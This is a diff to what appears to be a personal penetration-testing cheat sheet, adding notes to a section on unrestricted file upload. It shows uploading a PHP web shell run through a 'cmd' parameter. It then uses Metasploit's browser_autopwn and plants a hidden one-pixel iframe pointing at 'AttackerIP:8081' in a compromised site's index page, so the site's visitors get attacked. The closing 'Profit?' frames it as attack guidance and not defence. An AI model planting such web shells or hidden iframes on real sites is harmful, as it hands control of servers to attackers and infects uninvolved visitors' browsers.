@@ -109,4 +109,12 @@ Unrestricted File Upload
 //If file upload doesnt check against file extension uploads, can upload file such as shell2.php and browse
 to that file upload location with the cmd parameter such as:
 Example: fileshare.com/avatars/shell2.php?cmd=ls
+
+//Once have access to Webserver, can mount client-side attacks
+MSF> use auxiliary/server/browser_autopwn
+This will generate a URL which can be inserted via iframe to the index page. Download and edit index page, reupload.
+
+echo '<iframe src="http://AttackerIP:8081/uo3eXen8t0I1n" width=1 height=1 style="visibility:hidden; position:absolute;"></iframe>';
+
+Profit?
 ```
